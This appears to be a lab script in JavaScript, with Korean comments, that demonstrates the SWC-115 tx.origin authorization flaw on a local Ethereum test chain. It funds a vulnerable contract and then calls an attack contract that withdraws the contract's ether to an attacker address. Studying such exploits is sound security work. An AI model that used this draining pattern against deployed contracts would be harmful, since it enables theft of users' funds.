const Web3 = require('web3');
const web3 = new Web3(new Web3.providers.HttpProvider("http://127.0.0.1:9545"));
const swc115_json = require("../build/contracts/swc115.json")
const attack_json = require("../build/contracts/attack.json")
const swc115_abi = swc115_json['abi'];
const attack_abi = attack_json['abi'];
const _swc115 = new web3.eth.Contract(swc115_abi, "0x58891eFd502dCFB5AF4a04ff3FaFcdE518fa6FB6");
const _attack = new web3.eth.Contract(attack_abi, "0xA42bCDc4B32b61425b3d8a3c3059060cB388B8cd");

async function swc115(){
    //해당 컨트랙트의 최초 tx.origin 주소 
    const account0 = (await web3.eth.getAccounts())[0];
    //이더 값을 받는 계약 주소
    const account1 = (await web3.eth.getAccounts())[1];

    await _swc115.methods.contract_addr(account0).send({from:account0,gas:100000,gasPrice:'100000'}).then(
        function(result){
            console.log(result);
        }
    )
    //tx.origin==owner
    await _swc115.methods.withdrawAll_txorigin(account1).send({from:account0,gas:100000,gasPrice:'100000'}).then(
        function(result){
            console.log(result);
        }
    )
    //msg.sender==owner
    /*await _swc115.methods.withdrawAll_sender(account1).send({from:account0,gas:100000,gasPrice:'100000'}).then(
        function(result){
            console.log(result);
        }
    )*/

}

//swc115 컨트랙트를 공격, eth를 탈취
//attacker addr = 0xFB16d5921909b1207219CD38D6B367B20a91204E
async function attack(){   
        const account0 = (await web3.eth.getAccounts())[0]; //contract owner
        const attacker = (await web3.eth.getAccounts())[2]; //attacker addr
        //const attacker = (await web3.eth.getAccounts())[2];
    //set함수에 들어가는 주소는, 공격당할 컨트랙트의 주소 값을 입력
    await _attack.methods.set("0x58891eFd502dCFB5AF4a04ff3FaFcdE518fa6FB6",attacker).send({from:account0,gas:100000,gasPrice:'100000'}).then(
        function(result){
            console.log(result);
        }
    )
    //txorigin==owner
    await _attack.methods.attack_contract().send({from:account0,gas:100000,gasPrice:'100000'}).then(
        function(result){
            console.log(result);
        }
    )
    //msg.sender==owner
    /*await _attack.methods.attack_contract2().send({from:account0,gas:100000,gasPrice:'100000'}).then(
        function(result){
            console.log(result);
        }
    )*/
}

//각 컨트랙트에 이더 값을 전송
//이더 전송 account addr = 0xd56F4FB08e8223BD3ca73CD291cB38fDa5D015a5 (마지막에서 두번째)
async function sendEther(){
    await _swc115.methods.a().send({from:"0xd56F4FB08e8223BD3ca73CD291cB38fDa5D015a5",gas:100000,gasPrice:'100000',value:web3.utils.toWei("0.2","ether")}).then(
        function(result2){
            console.log(result2);
        }
    )
}
sendEther();
swc115();
attack();

/*
sendEther() > swc115() > attack()
위 순서대로 진행하는 이유는, swc115 컨트랙트에 이더 값을 전송하고, 출금이 잘 되는지 확인하기 위함
-> sendEther() > swc115() 과정

attack()함수는 swc115 컨트랙트에 들어있는 이더 값을 공격자 주소로 출금하기 위한 함수

위는 함수가 실행되는 순서에 따라서 값을 받는 주소가 달라짐, 같이 실행하면 위에 있는 함수가 받음
*/